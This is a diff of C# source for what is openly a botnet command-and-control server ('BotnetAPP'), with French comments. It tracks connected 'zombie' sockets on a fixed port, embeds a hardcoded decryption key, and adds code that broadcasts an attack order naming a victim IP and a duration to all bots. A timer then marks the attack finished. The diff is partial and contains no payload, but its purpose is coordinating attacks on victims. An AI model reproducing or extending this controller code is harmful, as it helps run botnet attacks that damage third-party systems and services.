@@ -23,10 +23,11 @@ namespace BotnetAPP.Network {
 
         private readonly int _listenPort = 2401 ; 
         private readonly string _decryptionCode = "pCw0bX$7OLQEI1!o^y%nc3^#";
-        private Boolean _ongoingAttack ; 
+        public Boolean AttackInProgress ; 
         private Dictionary<Zombie, Socket> _connectedBot ;
-        
 
+        // Timer 
+        public System.Timers.Timer TimerAttack ; 
 
         // Event
         public event EventConnectionHandler NewConnectedBot;
@@ -38,7 +39,8 @@ namespace BotnetAPP.Network {
 
         // Thread
         private Thread _checkingConnectionRequest ;
-        private Thread _checkingBotDisconnection ; 
+        private Thread _checkingBotDisconnection ;
+        private Thread _timerThread ; 
 
         private ASCIIEncoding _asen = new ASCIIEncoding();
 
@@ -60,8 +62,10 @@ namespace BotnetAPP.Network {
         // Initialisation de la liste contenant les utilisateurs connectés 
         _connectedBot = new() ;
 
+        TimerAttack = new() ; 
 
-        _ongoingAttack = false ;
+
+        AttackInProgress = false ;
 
         // Initialisation des threads et démarrage
 
@@ -77,8 +81,40 @@ namespace BotnetAPP.Network {
 
     }
 
+
     /*
 
+    Lance le timer 
+
+    */
+
+    private void SetTimer(int second) {
+        TimerAttack = new System.Timers.Timer() ;
+        TimerAttack.Interval = second*1000;
+        TimerAttack.Enabled = true ;
+        TimerAttack.AutoReset = false ;
+
+        TimerAttack.Elapsed += AtEndAttack;
+
+        /*_timerThread = new Thread(StartTimer) ;
+        _timerThread.Name = "Timer Attack" ;
+        _timerThread.Start() ; */
+
+
+    }
+
+
+        private void AtEndAttack(Object source, ElapsedEventArgs e)
+    {
+
+        OnEndAttack(new Zombie()) ; 
+            AttackInProgress = false ;
+            Console.WriteLine("L'attaque est fini ") ; 
+    }
+
+
+
+/*
     Ecriture et lecture des messages  envoyés et reçu par l'un des clients
 
     */
@@ -109,11 +145,14 @@ namespace BotnetAPP.Network {
 
     public void GiveOrder(Order order) {
 
+        Console.WriteLine($"L'attaque contre {order.VictimIP} pendant {order.nbSecond}") ; 
+        SetTimer(order.nbSecond) ; 
+        BroadcastNetMessage(Data<Order>.DataToXml(order)) ;
 
-       // Console.WriteLine("test") ; 
-     //  Console.WriteLine(Data<Order>.DataToXml(order)) ; 
+        AttackInProgress = true ;
 
-        BroadcastNetMessage(Data<Order>.DataToXml(order)) ; 
+        
+          
     }
  
     
@@ -123,7 +162,6 @@ namespace BotnetAPP.Network {
 
 
     public void CheckBotsDisconnections() {
-        
 
         while (true) {
 
